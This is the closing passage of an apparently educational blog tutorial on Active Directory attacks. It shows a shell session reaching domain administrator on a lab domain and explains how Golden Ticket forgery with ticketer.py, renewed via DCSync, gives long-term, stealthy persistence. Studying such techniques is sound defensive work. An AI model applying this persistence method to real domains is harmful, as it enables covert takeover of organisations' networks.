<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBv3</span><span class="mf">.0</span> <span class="n">dialect</span> <span class="n">used</span>
<span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Launching</span> <span class="n">semi</span><span class="o">-</span><span class="n">interactive</span> <span class="n">shell</span> <span class="o">-</span> <span class="n">Careful</span> <span class="n">what</span> <span class="n">you</span> <span class="n">execute</span>
<span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
<span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">&gt;</span><span class="n">whoami</span>
<span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">administrator</span>

<span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">&gt;</span>
</pre></div>
<p>Great, it worked! Now, we have <code>administrator</code> access.</p><br/>
<p>Using the <strong>Golden Ticket</strong> technique enables an attacker to establish long-term persistence within the domain as a highly privileged user. Uless the <code>krbtgt</code> credentials are rotated, the malicious TGT remains valid indefinitely. By default, <code>ticketer.py</code> sets the TGT's validity duration to 10 years, even though the <code>krbtgt</code> credentials are typically rotated every 180 days. However, if the attacker continuously obtains updated <code>krbtgt</code> credentials (e.g., through DCSync or another method), they can maintain long-term access. Even if other user accounts or passwords are changed, the attacker’s access remains unaffected. This makes Golden Tickets particularly dangerous for establishing stealthy and persistent control over a compromised domain.</p><br/>
<br/><h2>Conclusion</h2><br/>
<p>In this article, we explored some of the most common attacks in Active Directory environments and demonstrated how to execute them on both Windows and Linux. Understanding these techniques not only highlights the potential vulnerabilities in AD but also emphasizes the importance of securing these environments.</p><br/>
<p>Remember, the goal is always to learn and apply this knowledge responsibly. By staying informed, we can better protect our systems and networks. Thank you for following along—happy learning, and see you in the next article!</p><br/>
<p><strong>Joaquín (AKA elswix)</strong></p><br/>
<h3>References</h3><br/>
<p><a href="https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</a><br/>
<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#user-enumeration">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#user-enumeration</a><br/>
<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication</a><br/>
<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a><br/>
<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync</a><br/>
<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket</a><br/>
<a href="https://www.thehacker.recipes/ad/movement/kerberos/ptt">https://www.thehacker.recipes/ad/movement/kerberos/ptt</a><br/>
<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key</a><br/>
<a href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver">https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver</a><br/>
<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast</a><br/>
<a href="https://www.tarlogic.com/es/blog/como-atacar-kerberos/">https://www.tarlogic.com/es/blog/como-atacar-kerberos/</a><br/>
<a href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos-tickets/">https://swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos-tickets/</a><br/>
<a href="https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver16">https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver16</a><br/>
<a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a><br/>
<a href="https://github.com/Pennyw0rth/NetExec">https://github.com/Pennyw0rth/NetExec</a></p><br/>
                        </div>
                    </div>

                </section>
            </main>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
